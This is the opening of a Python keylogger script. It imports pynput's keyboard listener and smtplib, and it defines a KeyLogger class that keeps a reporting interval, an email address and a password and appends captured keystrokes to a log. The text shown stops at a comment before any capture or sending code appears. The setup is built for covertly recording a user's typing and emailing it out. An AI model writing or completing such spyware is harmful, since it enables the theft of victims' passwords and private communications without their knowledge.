#!/usr/bin/env python

import smtplib

import threading

from pynput import keyboard

#Create Keylogger Class

class KeyLogger:
  #__init__ variables
  def __init__(self, time_interval, email, password):
    self.interval = time_interval
    self.log = "keylogger has started...."
    self.email = email
    self.password = password

  #creating log to append all keystokes

  def append_to_log(self, string):
    self.log = self.log + string

  #create keylogger

